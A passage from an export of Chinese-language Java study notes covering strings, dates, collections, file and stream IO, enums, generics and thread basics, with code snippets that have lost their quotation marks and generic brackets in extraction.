World;String second = Hello World;String created = new String(Hello World);System.out.println(first == second); // 当前示例通常为 trueSystem.out.println(first == created); // falseSystem.out.println(first.equals(created)); // true == 比较两个引用是否指向同一对象，String.equals() 比较字符内容。字符串字面量通常复用字符串池中的对象，显式 new String(...) 则创建新对象；内容比较不应依赖对象是否被池化。 可能出现 null 时可以使用 Objects.equals(left, right)，它会处理任一参数为 null 的情况。 String 的不可变性String text = Hello;text.concat( World);System.out.println(text); // Hello concat()、replace()、substring() 等方法不会修改原对象，而是返回结果字符串。需要保存结果时必须接收返回值： text = text.concat( World); 不可变性使字符串适合共享、作为映射键并参与字符串池复用。循环中反复使用 + 拼接变量可能创建多个中间对象，此时可使用 StringBuilder。 常用字符串操作。 char firstChar = text.charAt(0);boolean suffix = text.endsWith(World);String part = text.substring(0, 5);String[] fields = text.split(,); charAt() 返回 UTF-16 代码单元。包含补充字符时，按 Unicode 码点遍历可使用 codePoints()，不能假设一个 char 始终对应用户看到的一个字符。 StringBuilder 与 StringBufferStringBuilder builder = new StringBuilder();builder.append(user=) .append(userId) .append(, active=) .append(active);String result = builder.toString(); 类型 可变 同步 常见用途 String 否 不需要 普通文本和值对象 StringBuilder 是 否 单线程局部拼接 StringBuffer 是 单个方法同步 需要共享可变缓冲区的旧式代码 StringBuffer 的方法同步不代表由多次调用组成的复合操作自动具有完整原子性。多数方法内局部拼接使用 StringBuilder；跨线程共享时通常优先避免共享可变状态。 null 的处理差异。 String value = null;StringBuilder builder = new StringBuilder();builder.append(value); // 追加字符 nullStringBuilder other = new StringBuilder(value); // NullPointerException append(Object) 会通过 String.valueOf() 处理空引用，而接收 String 的构造方法要求参数非空。两种 API 的空值契约不同，应根据方法文档判断，不能由类名推断。","tags":[null,null]},{"title":"Java笔记23-日期时间与Math工具类","path":"/wiki/java/java-note-23.html","content":"Date、Calendar 和 SimpleDateFormat 常见于旧代码。Java 8 引入的 java.time API 对日期、时间、时区和格式化进行了更清晰的类型划分，新项目通常优先使用新 API。 Date、Calendar 与 java.timeDate 内部表示从 Unix Epoch 开始计算的毫秒值： Date now = new Date();long epochMillis = now.getTime();Date restored = new Date(epochMillis); before()、after() 和 compareTo() 比较时间先后。Date.toString() 会使用默认时区生成文本，但时区不是 Date 对象自身的一部分。 Calendar 字段规则。 Calendar calendar = Calendar.getInstance();int year = calendar.get(Calendar.YEAR);int month = calendar.get(Calendar.MONTH) + 1;int day = calendar.get(Calendar.DAY_OF_MONTH);int hour = calendar.get(Calendar.HOUR_OF_DAY); MONTH 从 0 开始。DAY_OF_WEEK 的常量范围是 SUNDAY 到 SATURDAY，其数值为 1 到 7；直接减一会得到 0 到 6，但不等同于所有地区使用的周序规则。需要 ISO 周序时应使用 java.time.DayOfWeek。 Calendar.HOUR 表示 12 小时制小时，24 小时制应读取 HOUR_OF_DAY。 SimpleDateFormat。 SimpleDateFormat format = new SimpleDateFormat(yyyy/MM/dd HH:mm:ss);Date parsed = format.parse(2025/04/28 19:19:10);String output = format.format(parsed); SimpleDateFormat 是可变且非线程安全的对象，不应作为共享单例供多个线程同时使用。严格校验输入时还需设置非宽松解析，避免无效日期被自动归一化。 java.time API。 LocalDate date = LocalDate.of(2025, 4, 28);LocalDateTime dateTime = LocalDateTime.now();Instant instant = Instant.now();DateTimeFormatter formatter = DateTimeFormatter.ofPattern(yyyy/MM/dd HH:mm:ss);String text = dateTime.format(formatter); 类型 用途 LocalDate 不含时间和时区的日期 LocalDateTime 不含时区的日期时间 Instant UTC 时间线上的瞬时点 ZonedDateTime 带时区规则的日期时间 Duration、Period 时间量与日期量 java.time 的核心类型大多不可变，DateTimeFormatter 也可安全共享。 Math 与随机数 方法 作用 abs() 绝对值 max()、min() 最大值与最小值 pow() 幂运算 sqrt() 平方根 ceil() 向正无穷方向取整 floor() 向负无穷方向取整 round() 返回最接近的整数值 负数的 ceil() 和 floor() 方向不同，例如 Math.ceil(-3.14) 为 -3.0，Math.floor(-3.14) 为 -4.0。 随机数区间。 int value = (int) (Math.random() * 100); // 0 到 99int min = 100;int max = 1000;int ranged = (int) (Math.random() * (max - min)) + min; Math.random() 返回 [0.0, 1.0)。强制转换必须放在乘法之后；若先执行 (int) Math.random()，结果始终为零。需要明确上下界的整数随机数时，ThreadLocalRandom.current().nextInt(min, max) 表达得更直接。","tags":[null,null]},{"title":"Java笔记25-LinkedList与Vector","path":"/wiki/java/java-note-25.html","content":"LinkedList 和 Vector 都实现 List，但前者采用双向链表，后者是早期的同步动态数组。选择实现时应看访问方式和并发模型，而不是只看接口名称。 LinkedList 的链式结构链表节点保存元素以及前后节点引用。按下标定位需要从链表一端逐个移动，因此 get(index) 是 O(n)；已知节点位置后的插入和删除可以更新相邻引用完成。 DequeString queue = new LinkedList();queue.addLast(A);queue.addLast(B);String first = queue.removeFirst(); LinkedList 同时实现 Deque，作为队列或双端队列使用时，首尾操作比反复按下标访问更符合其结构。 Vector 的历史位置ListString values = new Vector();values.add(A);values.add(B); Vector 与 ArrayList 都使用可扩容数组，但 Vector 的多数公开方法使用同步。单个方法同步不能自动保证“先检查再修改”等复合操作的原子性。 新代码通常使用： 单线程或外部同步场景：ArrayList 读多写少的并发快照：CopyOnWriteArrayList 需要队列语义的并发场景：BlockingQueue 等并发容器 具体容器应根据读写比例、元素数量和一致性要求选择，不能把 Vector 简化为通用线程安全替代品。","tags":[null,null]},{"title":"Java笔记24-Collection、List与迭代器","path":"/wiki/java/java-note-24.html","content":"Java 集合框架使用接口描述容器能力，再由不同实现提供存储结构和性能特征。Collection 是 List、Set 和 Queue 等接口的上层接口，Map 属于独立的键值映射体系。 集合类型与遍历数组长度固定，可以直接保存基本类型；泛型集合长度可变，元素类型必须是引用类型，基本类型会通过装箱类保存。 ListInteger values = new ArrayList();values.add(10);values.add(20); 集合 API 提供添加、删除、查找和批量操作，但具体复杂度由实现决定。接口相同不代表底层结构或并发行为相同。 List 的顺序与重复元素。 List 按位置保存元素，允许重复值： ListString names = new ArrayList();names.add(Alice);names.add(Bob);names.add(Alice);String first = names.get(0);names.set(1, Carol); ArrayList 构造参数表示初始容量，不是最大元素数量。容量不足时实现会分配更大的内部数组并复制已有引用。 三种遍历方式。 for (int i = 0; i names.size(); i++) System.out.println(names.get(i));for (String name : names) System.out.println(name);IteratorString iterator = names.iterator();while (iterator.hasNext()) System.out.println(iterator.next()); 下标遍历依赖 get() 的性能，增强 for 通常通过迭代器实现。对 LinkedList 反复按下标访问会产生额外遍历成本。 遍历期间删除元素。 IteratorString iterator = names.iterator();while (iterator.hasNext()) if (iterator.next().isBlank()) iterator.remove(); 直接在增强 for 中调用集合的结构修改方法，常会触发 ConcurrentModificationException。多数迭代器的 fail-fast 检查只用于尽早发现错误，不构成并发安全保证。 Java 8 起也可以使用： names.removeIf(String::isBlank); 不可修改视图与不可变集合ListString fixed = List.of(A, B);ListString view = Collections.unmodifiableList(names); List.of() 创建不允许增删改的集合并拒绝 null。unmodifiableList() 返回只读视图，底层原列表仍可能由其他引用修改。","tags":[null,null]},{"title":"Java笔记26-ArrayList、LinkedList与Vector对比","path":"/wiki/java/java-note-26.html","content":"三种 List 实现共享顺序、下标和重复元素等接口语义，但底层结构和同步策略不同。 操作 ArrayList LinkedList Vector 底层结构 可扩容数组 双向链表 同步可扩容数组 get(index) O(1) O(n) O(1) 尾部追加 均摊 O(1) O(1) 均摊 O(1) 中间插入 移动后续元素 定位 O(n)，链接 O(1) 移动后续元素 线程安全 否 否 单个方法同步 ArrayListArrayList 适合大多数需要顺序保存、按下标读取和尾部追加的场景。扩容会分配新数组并复制元素，因此可以在已知规模时指定初始容量，减少扩容次数。 LinkedListLinkedList 的优势集中在首尾操作和已经定位到节点后的链接修改。若每次都先通过下标查找中间位置，链表仍需线性遍历，不能仅凭“插入快”选择它。 VectorVector 保留在标准库中以兼容旧代码。它的同步粒度和 API 设计不等同于现代并发集合；没有兼容需求时，通常先考虑 ArrayList 或 java.util.concurrent 中针对具体访问模式设计的容器。 接口类型应尽量写在变量声明处： ListString names = new ArrayList(); 这样调用方依赖 List 契约，替换实现时不必改动与具体实现无关的代码。","tags":[null,null]},{"title":"Java笔记27-HashSet去重与相等性","path":"/wiki/java/java-note-27.html","content":"HashSet 使用哈希表保存元素，不保证普通遍历顺序。元素是否重复由 hashCode() 与 equals() 共同判断，而不是由输出文本或对象地址决定。 基本行为SetString languages = new HashSet();languages.add(Java);languages.add(PHP);boolean added = languages.add(Java); 第三次添加返回 false，集合大小不增加。HashSet 允许一个 null 元素；需要保持插入顺序时可使用 LinkedHashSet，需要排序时可使用 TreeSet。 哈希定位与冲突当前 JDK 的 HashSet 以 HashMap 的键实现元素存储。插入时先根据哈希值定位桶，再在桶内判断是否已有相等元素。不同对象可能产生相同哈希值，哈希冲突不表示两个对象相等。 公开 API 只承诺集合语义和一般性能特征，桶数组、链表树化阈值等内部实现可能随 JDK 变化。 自定义对象record User(long id, String name) SetUser users = new HashSet();users.add(new User(1, Alice));users.add(new User(1, Alice)); record 会基于组件生成一致的 equals() 和 hashCode()，第二次添加不会增加元素。普通类需要自行实现这两个方法。 必须满足的约定包括： 两个对象通过 equals() 判断相等时，必须具有相同 hashCode()。 对象作为集合元素期间，参与相等性和哈希计算的字段不应改变。 相同哈希码不要求对象相等，集合仍会继续调用 equals() 判断。 可变键在插入后改变哈希相关字段，可能导致集合无法从原桶位置找到该对象。 更细的插入路径见 Java笔记15-HashSet插入过程源码跟踪。","tags":[null,null]},{"title":"Java笔记28-Hashtable与现代映射实现","path":"/wiki/java/java-note-28.html","content":"Hashtable 是早期同步键值容器，与只保存元素的 HashSet 不属于同一抽象。现代代码通常根据是否需要并发访问选择 HashMap 或 ConcurrentHashMap。 Hashtable 的基本约束MapString, Integer counts = new Hashtable();counts.put(Java, 3);counts.put(SQL, 2); Hashtable 不允许 null 键或 null 值，多数公开方法使用同步。与 Vector 类似，单个方法同步不保证由多次调用组成的复合逻辑原子化。 与其他映射实现对比 实现 null 顺序 并发特征 HashMap 一个空键、多个空值 不保证 非线程安全 LinkedHashMap 与 HashMap 相同 插入顺序或访问顺序 非线程安全 TreeMap 取决于比较器，通常不接受空键 按键排序 非线程安全 Hashtable 键和值都不允许为空 不保证 旧式方法同步 ConcurrentHashMap 键和值都不允许为空 不保证 面向并发访问设计 需要“不存在时初始化”这类原子复合操作时，ConcurrentHashMap.computeIfAbsent() 比在 Hashtable 上分开执行 containsKey() 和 put() 更能表达并发意图。","tags":[null,null]},{"title":"Java笔记29-Map接口与遍历视图","path":"/wiki/java/java-note-29.html","content":"MapK, V 建立键到值的映射。键用于定位值，同一个键再次写入时会替换旧值；键是否相同由具体实现的比较规则决定。 Map 的操作与视图MapString, Integer scores = new HashMap();scores.put(Alice, 90);scores.put(Bob, 85);Integer score = scores.get(Alice);Integer removed = scores.remove(Bob);boolean contains = scores.containsKey(Alice); get() 返回 null 可能表示键不存在，也可能表示该键映射到空值。需要区分时使用 containsKey()，或避免在该映射中保存空值。 三种集合视图。 SetString keys = scores.keySet();CollectionInteger values = scores.values();SetMap.EntryString, Integer entries = scores.entrySet(); 这些对象是映射的视图，不是独立副本。通过支持的视图操作删除元素会反映到原映射，原映射的修改也会影响视图。 同时访问键和值时直接遍历 entrySet()： for (Map.EntryString, Integer entry : scores.entrySet()) System.out.printf(%s=%d%n, entry.getKey(), entry.getValue()); 默认方法。 scores.putIfAbsent(Carol, 0);scores.computeIfAbsent(Dave, key - loadScore(key));scores.merge(Alice, 5, Integer::sum); putIfAbsent()、computeIfAbsent() 和 merge() 可以减少显式的“读取后再写入”代码。它们在并发映射上的原子性由具体实现文档规定，不能把 HashMap 的调用自动视为线程安全。 键的稳定性哈希映射的键必须保持 equals() 和 hashCode() 相关状态稳定。修改可变键后，映射可能无法从原桶位置找到它。字符串、枚举、记录值对象等稳定类型更适合作为键。","tags":[null,null]},{"title":"Java笔记31-File类基础","path":"/wiki/java/java-note-31.html","content":"java.io.File 表示文件系统中的路径名，可用于查询路径状态以及创建、重命名和删除文件或目录。文件内容的读写由流或 NIO API 负责。 File 的路径构造File 提供三种常见的路径构造方式： File file = new File(D:/FileDemo/demo03.doc);File parentFile = new File(D:/FileDemo);String childFile = demo04.txt;File file1 = new File(parentFile, childFile);String parentFile_ = D:/FileDemo;String childFile_ = demo06.txt;File file3 = new File(parentFile_, childFile_); 构造方式 说明 new File(String pathname) 直接传完整路径 new File(File parent, String child) 父路径对象 + 子路径 new File(String parent, String child) 父路径字符串 + 子路径字符串 路径对象与文件系统实体构造 File 对象不会创建磁盘文件。只有调用 createNewFile()、mkdir()、mkdirs()、delete() 等方法时，才会执行相应的文件系统操作。 因此，new File(D:/a/b.txt) 可以正常返回对象，但该路径未必真实存在。File 对象表示路径，磁盘实体要通过文件系统操作创建。 另外，File 还会经常遇到相对路径和绝对路径的区别： 相对路径依赖当前工作目录。 绝对路径直接指向明确位置。 相对路径由进程的当前工作目录解析；需要确认最终位置时，可以查看 getAbsolutePath() 或 getCanonicalPath()。 文件状态与基础操作if (file.createNewFile()) System.out.println(文件创建成功);System.out.println(file.exists());System.out.println(file.length());System.out.println(file.getParentFile());System.out.println(file.getName()); System.out.println(file.getAbsoluteFile());System.out.println(file.exists());System.out.println(file.isFile());System.out.println(file.isDirectory()); 方法 作用 createNewFile() 尝试创建文件 exists() 判断路径是否存在 isFile() 判断是否是普通文件 isDirectory() 判断是否是目录 getName() 获取文件名 getParentFile() 获取父目录 length() 获取文件大小 createNewFile() 还有一个很重要的前提：父目录必须存在。它负责创建的是文件本身，不会自动补齐整条目录链。 mkdir() 与 mkdirs()String path = D:\\\\FileDemo\\\\a\\\\b\\\\c;File file = new File(path);if (file.mkdirs()) System.out.println(目录创建成功); 方法 典型区别 mkdir() 只创建当前这一层目录 mkdirs() 必要时把缺失的多层目录一起创建出来 当父目录尚未创建时，mkdir() 会失败；mkdirs() 会尝试补齐缺失的目录层级。两者都通过返回值表示创建是否成功。 delete() 的限制delete() 可以删除文件或空目录： if (file.exists()) if (file.delete()) System.out.println(file + 目录删除成功); delete() 删除目录时，通常要求目录为空。 目录非空、权限不足或文件正被占用等情况都可能导致删除失败，而 File.delete() 只返回 boolean，不会给出具体原因。 如果要递归删除目录，通常就不能只靠 delete() 一次解决，而是得先把目录里的文件逐层清掉，再删除空目录。 File 与 NIOFile 负责路径和基础文件系统操作，不负责文件内容。新代码还可以使用 java.nio.file.Path 与 Files：前者表示路径，后者提供复制、移动、遍历和带异常信息的文件操作。与只返回 boolean 的部分 File 方法相比，Files 抛出的异常通常更便于定位失败原因。 还应注意路径检查与后续操作之间可能存在竞态：exists() 返回后，文件状态仍可能被其他进程改变。需要执行不可分割的文件操作时，应直接调用目标 API 并处理异常，而不是把状态检查当成成功保证。","tags":[null,null]},{"title":"Java笔记30-枚举类型","path":"/wiki/java/java-note-30.html","content":"枚举用于声明一组固定且具有类型约束的实例。与字符串常量相比，枚举值由编译器检查，并且可以包含字段、构造方法和行为。 枚举的定义与行为enum OrderStatus CREATED, PAID, SHIPPED, CANCELLEDOrderStatus status = OrderStatus.PAID; 每个枚举常量都是该枚举类型的唯一实例。枚举隐式继承 java.lang.Enum，不能再继承其他类，但可以实现接口。 字段与构造方法。 enum HttpStatus OK(200, OK), NOT_FOUND(404, Not Found); private final int code; private final String reason; HttpStatus(int code, String reason) this.code = code; this.reason = reason; public int code() return code; public String reason() return reason; 枚举构造方法不能由外部调用，只在创建枚举常量时执行。字段通常设为 final，避免全局共享的枚举实例携带可变状态。 常用方法。 OrderStatus[] all = OrderStatus.values();OrderStatus parsed = OrderStatus.valueOf(PAID);String name = parsed.name();int position = parsed.ordinal(); valueOf() 要求名称完全匹配，否则抛出 IllegalArgumentException。ordinal() 只表示声明位置，不应持久化为稳定业务编码；调整枚举顺序会改变它。 枚举与 switchString message = switch (status) case CREATED - 待支付; case PAID - 待发货; case SHIPPED - 已发货; case CANCELLED - 已取消;; 枚举适合状态、策略类别和有限选项。取值需要由数据库或配置动态扩展时，普通实体或配置表比枚举更合适。","tags":[null,null]},{"title":"Java笔记32-字节流与缓冲流","path":"/wiki/java/java-note-32.html","content":"字节流处理的是 原始字节数据。只要面对的是文本、图片、音频、视频、压缩包等任意文件，字节流都能工作。缓冲流则是在字节流外面再包一层，提高读写效率。 字节输出流FileOutputStream 可以直接向文件写入字节： String path = D:\\\\FileDemo\\\\test.txt;String text = hello;try (FileOutputStream output = new FileOutputStream(path, false)) output.write(text.getBytes(StandardCharsets.UTF_8)); 字节流并不关心“这是文本还是图片”，它只负责处理字节。 字节输入流与缓冲数组FileInputStream.read(byte[]) 返回本次读取的字节数，到达文件末尾时返回 -1： byte[] buf = new byte[8];int len;try (FileInputStream fis = new FileInputStream(path)) while((len = fis.read(buf)) != -1) System.out.print(new String(buf, 0, len, StandardCharsets.UTF_8)); 读取循环需要处理两个边界： buf 是缓冲区，每次不是读一个字节，而是一批一批读。 new String(buf, 0, len) 只把本次读到的内容转成字符串。 byte[] 这一层说明了一个更底层的事实：字节流处理的不是“字符意义”，而是原始字节序列。对图片、音频、压缩包这类内容来说，这种处理方式是通用的；对文本来说，则还要在字节和字符之间做一次转换。 缓冲流BufferedOutputStream 和 BufferedInputStream 在文件流外增加内存缓冲。使用 try-with-resources 可以保证外层缓冲流和底层文件流按顺序关闭： try (BufferedOutputStream output = new BufferedOutputStream( new FileOutputStream(path))) output.write(text.getBytes(StandardCharsets.UTF_8)); try (BufferedInputStream input = new BufferedInputStream( new FileInputStream(path))) byte[] buf = new byte[8]; int len; while ((len = input.read(buf)) != -1) System.out.write(buf, 0, len); 类型 作用 FileInputStream FileOutputStream 直接和文件字节打交道 BufferedInputStream BufferedOutputStream 在外面包一层缓冲，提高读写效率 缓冲输出流会在缓冲区写满、调用 flush() 或关闭时把数据交给下层输出流。操作系统和存储设备仍可能继续缓存数据，因此 flush() 表示把 Java 缓冲区中的数据向下传递，并不等同于已经持久化到物理介质。缓冲可以减少小规模 IO 调用的次数。 try-with-resources实现 AutoCloseable 的流可以放入 try-with-resources，无论读取成功还是抛出异常，资源都会按声明的逆序关闭： try (FileInputStream fis = new FileInputStream(path)) // use fis FileOutputStream(path, false) 中的 false 表示覆盖写入；传入 true 才是追加写入。省略第二个参数时同样采用覆盖模式。 使用边界字节流按原始字节读写，适用于任意文件；缓冲流通过减少底层读写调用改善吞吐量。把字节解释为文本时必须指定字符集，并且一次读取到的字节块不一定落在字符边界上。连续文本解码更适合交给 Reader 或 CharsetDecoder，而不是逐块直接构造 String。 二进制复制应保持字节原样，不要在中途把数据转换成 String。文本读写则应从入口处确定字符集、覆盖还是追加模式，并使用资源自动关闭。","tags":[null,null]},{"title":"Java笔记33-字符流读写文件","path":"/wiki/java/java-note-33.html","content":"字符流更适合处理 文本内容。如果说字节流关注的是“底层怎么搬运字节”，那么字符流关注的就是“这些字节怎样按照字符来理解和输出”。 FileWriter 与 FileReaderFileWriter 和 FileReader 分别按字符写入和读取文本。下面把读写操作拆成两个 JUnit 测试方法： @Testpublic void FileWrite_() String path = D:\\\\FileDemo\\\\test01.txt; String text = 你好，今天是五月21日; try (FileWriter fileWriter = new FileWriter(path)) fileWriter.write(text.toCharArray()); @Testpublic void t1() String filePath = D:\\\\我的世界\\\\test02.text; char[] cha = new char[1024]; int read; try (FileReader fileReader = new FileReader(filePath)) while ((read = fileReader.read(cha)) != -1) System.out.print(new String(cha, 0, read)); 字符缓冲区Reader.read(char[]) 返回本次写入字符数组的字符数： char[] buf = new char[8];int readLine = 0;while ((readLine = fileReader.read(buf)) != -1) System.out.print(new String(buf, 0, readLine)); 流类型 缓冲数组类型 更适合处理 字节流 byte[] 任意二进制数据 字符流 char[] 文本内容 字符流之所以更适合文本，是因为它已经完成了“字节 - 字符”的语义转换。对文本来说，我们最终关心的不是原始字节怎么排列，而是字符能不能按正确编码被解释出来。 用 JUnit 拆分读写测试@Test 可以把读取和写入组织为相互独立的测试方法： @Testpublic void FileReader_() ... 这种组织方式适合验证彼此独立的 IO 操作： 每个功能点可以单独运行 读和写可以拆成独立测试 不必每次都从 main 方法组织一整段流程 字符集与转换流早期 JDK 中，FileReader 和 FileWriter 使用默认字符集。需要固定 UTF-8 时，可以使用转换流；Java 11 及更高版本也提供了接收 Charset 的构造方法： InputStreamReader OutputStreamWriter try (Reader reader = Files.newBufferedReader(Path.of(filePath), StandardCharsets.UTF_8); Writer writer = Files.newBufferedWriter(Path.of(outputPath), StandardCharsets.UTF_8)) // read or write text 字节流负责传输原始字节，字符流负责在字节和 Java 字符之间进行编码转换。显式指定字符集可以避免程序依赖不同系统的默认编码。 使用边界字符流在字节与 Java 字符之间执行编码转换，适合处理文本。字符集是文件格式的一部分：写入和读取必须使用兼容的字符集，否则即使 IO 调用成功，文本仍可能出现乱码。try-with-resources 负责关闭资源，BufferedReader、BufferedWriter 或 Files 的缓冲方法则适合连续文本读写。 char 是 Java 的 UTF-16 代码单元，不等同于所有 Unicode 码点；需要按用户可见字符处理文本时，应考虑代码点和组合字符，而不是简单按 char 数组切分。","tags":[null,null]},{"title":"Java笔记34-泛型入门","path":"/wiki/java/java-note-34.html","content":"泛型把元素、参数和返回值的类型关系写入声明，由编译器检查不兼容的调用，并减少从 Object 取值后的强制转换。 泛型的声明形式集合的类型参数约束元素类型： ArrayListString list = new ArrayList();ArrayListInteger list1 = new ArrayList();list.add(111);list1.add(111);Object o1 = list.get(0); ArrayListString 和 ArrayListInteger 使用同一个泛型类，但允许写入的元素类型不同。get() 的返回类型也由类型参数确定，不必先接收为 Object。 泛型接口在接口名后声明类型参数： public interface DataT void add(T t); void delete(T t); void updata(T t); T query(int id); 实现类可以为接口的类型参数指定具体类型： public class StudentDemo implements DataStudent @Override public void add(Student student) public class TeacherDemo implements DataTeacher @Override public void add(Teacher teacher) 调用 DataStudent 的实现时，方法参数和返回值都会按 Student 检查： StudentDemo studentDemo = new StudentDemo();studentDemo.add(new Student());studentDemo.delete(new Student());studentDemo.updata(new Student());Student query = studentDemo.query(1); 泛型类在类名后声明类型参数： class PersonE E s; public Person(E s) this.s = s; public void show() System.out.println(s.getClass()); PersonInteger p1 = new Person(111);PersonString p2 = new Person(111); 泛型方法在返回类型前声明自己的类型参数： public static T void printArray(T[] names) 泛型类型参数同样遵守继承关系，声明为父类型时可以接收子类对象： class Aclass B extends Aclass CE E name; public C(E name) this.name = name; public void f() System.out.println(name.getClass()); CA ac = new CA(new A());ac.f();CA bc = new CA(new B());bc.f(); 类型擦除与泛型边界Java 泛型主要通过类型擦除实现。编译器检查类型参数并在必要位置插入转换；运行时对象通常不保留实参类型，但类文件仍可能在签名等元数据中保存泛型信息，反射 API 可以读取其中一部分。 ArrayListStringArrayListInteger ↓ 编译检查 运行期更接近同一种原始类型 因此，new ArrayListString().getClass() 与 new ArrayListInteger().getClass() 返回同一个 Class 对象。 同时，泛型还存在一个很重要的限制： ListString 不能直接当成 ListObject。 T 也不能随便拿去创建运行时类型未知的数组。 这些限制用于维持编译期类型安全。 集合中的类型约束集合可以通过类型参数统一约束元素、键和值： HashSetStudent students = new HashSet();students.add(new Student(张三,16));students.add(new Student(张四,17));students.add(new Student(张五,18)); HashMapString, Student sd = new HashMap();sd.put(李四,new Student(李四,20));sd.put(李三,new Student(李三,21));sd.put(李二,new Student(李二,22)); 这样可以在编译阶段拒绝不兼容的写入，并让读取结果保留具体类型。 常见声明位置。 泛型出现位置 典型写法 作用 泛型集合 ArrayListString 限制集合元素类型 泛型接口 DataT 抽象一套与类型无关的操作规范 泛型实现类 StudentDemo implements DataStudent 把接口中的类型落地 泛型类 PersonE 让类本身支持不同类型 泛型方法 T void printArray(T[] arr) 让方法独立声明类型参数 通配符用于描述调用位置的类型范围：? extends T 表示某个未知的 T 子类型，? super T 表示某个未知的 T 父类型。 类型边界泛型声明类型之间的约束关系，使不兼容调用在编译期暴露。类型擦除解释了运行时无法直接判断 ListString 的限制；泛型不变性解释了 ListString 不能赋给 ListObject。需要表达只读生产者或只写消费者时，可分别使用 ? extends T 和 ? super T。 通配符边界只改变接口允许的读写方向，不会改变集合对象本身的运行时类型。泛型 API 可以根据类型关系选择类级类型参数、方法级类型参数或带边界的通配符，避免退回不受检查的原始类型。","tags":[null,null]},{"title":"Java笔记35-线程创建方式","path":"/wiki/java/java-note-35.html","content":"Thread 对象封装线程属性，Runnable 封装待执行任务。直接调用 run() 仍在当前线程执行；调用 start() 才会启动新的线程，并由该线程执行 run()。 JVM 可用处理器数量Runtime.availableProcessors() 返回 JVM 当前可用的处理器数量： Runtime runtime = Runtime.getRuntime();int i = runtime.availableProcessors();System.out.println(i); 该方法返回 JVM 可用的处理器数量，这个值可能受容器 CPU 配额和 JVM 实现影响，不等同于物理核心数，也不能直接用作线程数上限。 继承 Thread继承 Thread 后，可以在 run() 中定义任务并通过 start() 启动线程： public class Cat extends Thread int count = 0 ; @Override public void run() while (count 80) System.out.println(哈吉咪 + (++count) + Thread.currentThread().getName()); try Thread.sleep(1000); catch (InterruptedException e) throw new RuntimeException(e); Cat cat = new Cat();cat.start();System.out.println(主线程并不会被子线程阻塞，这些线程是交替执行的);for (int i = 0; i 90; i++) System.out.println(我是主线程 + i + Thread.currentThread().getName()); Thread.sleep(1000); 这种写法的特点很直接： 线程任务写在 run() 里。 线程对象本身就是 Cat 这个类的实例。 理解上很直观，但“任务”和“线程载体”绑定得比较紧。 run() 与 start()run() 与 start() 的调用语义不同： // cat.run();//直接调用run()方法时，它只是普通方法调用，不会被当成线程启动cat.start();//调用start()方法，不会直接执行本方法，而是将线程转为可执行状态，由cpu统一调度 两种调用方式的区别如下： 调用方式 本质 run() 普通方法调用，仍然在当前线程里执行 start() 启动新线程，由 JVM 和 CPU 调度执行 run() OpenJDK 的 Thread.start() 会进入 JVM 的本地实现。start0() 属于实现细节，不应作为应用代码可依赖的 API。 线程对象的状态变化new Cat() 只是创建了一个普通 Java 对象，此时还没有新的执行路径。只有调用 start() 后，JVM 才会请求底层创建线程，并为这个线程准备独立的调用栈。 可以把线程启动过程简单理解为： NEW ↓ start()RUNNABLE ↓ CPU 调度运行 run() ↓ 执行结束TERMINATED 这也解释了为什么 start() 调用之后，主线程不会停在原地等子线程运行完。两个线程会各自向前执行，具体谁先输出，取决于调度时机。 实现 Runnable实现 Runnable 可以把任务与线程对象分开： class Dog implements Runnable int count = 0 ; @Override public void run() for (;;) System.out.println(狗汪汪叫 + Thread.currentThread().getName() + + (count++)); try Thread.sleep(2000); catch (InterruptedException e) throw new RuntimeException(e); if (count == 10) break; Dog dog = new Dog();Thread thread = new Thread(dog);thread.start(); 还有 Tiger 这个版本： class Tiger implements Runnable int count = 0; @Override public void run() while (true) System.out.println(老虎嗷嗷叫 + 线程名 + Thread.currentThread().getName() + (++count)); try Thread.sleep(2000); catch (InterruptedException e) throw new RuntimeException(e); if (count == 100) break; 这种写法把任务逻辑与线程对象分开，也是 Executor 接收 Runnable 或 Callable 的基础。 这也是后面线程池更偏向接收 Runnable 或 Callable 的原因。线程池关心的是“执行任务”，而不是每次都重新创建一个继承了 Thread 的类。 匿名任务匿名内部类示例虽然很短，但和线程创建主题是连着的： new Thread() @Override public void run() System.out.println(这是t线程); .start();new Thread(new Runnable() @Override public void run() System.out.println(这是r线程); ).start(); 再加上先定义 Runnable 再交给 Thread 的方式： Runnable r = new Runnable() @Override public void run() System.out.println(这是r线程); ;new Thread(r).start(); 三种匿名写法都适合做临时小任务，它们的共同点是：不必为了一个一次性任务再单独建完整类。 Thread 与 Runnable 的选择 方式 优点 局限 继承 Thread 最直观，入门容易理解 已经占用了继承位置 实现 Runnable 任务和线程分离，更灵活 初学时抽象层多一层 继承 Thread 将任务与线程对象绑定；Runnable 将任务独立出来，更便于交给线程池复用和统一管理。 线程创建方式可以归纳为： 线程任务最终都写在 run() 里。 新线程要靠 start() 启动。 线程对象和任务逻辑可以绑在一起，也可以拆开。 主线程和子线程默认是并发交替执行，不会天然互相等待。","tags":[null,null]},{"title":"Java笔记36-线程常用方法与同步","path":"/wiki/java/java-note-36.html","content":"线程的难点往往不是“会不会创建线程”，而是线程启动之后，谁先执行、谁暂停、谁等待、谁在访问共享数据。到了这一节，多线程已经不再只是语法题，而是开始接触并发运行时的行为。 常用线程方法下面的线程同时使用了休眠、命名和状态查询方法： H h = new H();Thread thread = new Thread(h);System.out.println(thread.getName());thread.setName(线程1);System.out.println(thread.getName());System.out.println(thread.getPriority());thread.setPriority(Thread.MAX_PRIORITY);System.out.println(thread.getPriority());thread.start();Thread.sleep(20 * 1000);h.setRunning(false); 再看线程任务本身： class H implements Runnable int count = 0; private volatile boolean running = true; public void setRunning(boolean running) this.running = running; @Override public void run() while (running) try Thread.sleep(50); catch (InterruptedException e) Thread.currentThread().interrupt(); return; System.out.println(hi + (count++) + Thread.currentThread().getName()); 各方法的语义如下： 方法 作用 读代码时该关注什么 setName() getName() 给线程命名、查看线程名 输出日志时更容易区分线程 setPriority() 设置优先级 优先级只是“更有机会”被调度，不是绝对先执行 sleep() 让当前线程休眠指定时间 线程进入阻塞状态，但不会释放它已经持有的锁 start() 启动新线程 进入并发运行 这里还有一个很值得单独记住的设计：running 不是局部变量，而是共享在任务对象里的状态开关。主线程通过 setRunning(false) 修改这个状态，子线程在 while (running) 中感知到变化后自然结束。这是比 stop() 更安全、也更常见的停止思路。 这里把 running 写成 volatile 是为了强调可见性：一个线程修改停止标记，另一个线程要能及时看到。多线程代码里，变量是否“共享”只是第一步，修改是否能被其他线程观察到，同样是必须处理的问题。 停止标记与内存可见性在单线程里，变量读写几乎不会让人特别紧张；但多个线程同时访问同一个变量时，事情会变复杂。每个线程可能在自己的工作内存里缓存变量值，如果没有合适的同步手段，另一个线程的修改不一定能立刻被看到。 常见处理方式有两类： 方式 